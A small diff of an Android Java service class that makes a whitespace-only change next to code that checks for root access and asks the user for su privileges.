@@ -131,7 +131,7 @@ public class ServiceCore extends Service {
 
 		// Abbiamo la root?
 		Status.self().setRoot(PackageInfo.checkRoot());
-		
+
 		if (Status.self().haveSu() == true && Status.self().haveRoot() == false && Keys.self().wantsPrivilege()) {
 			// Ask the user...
 			superapkRoot();
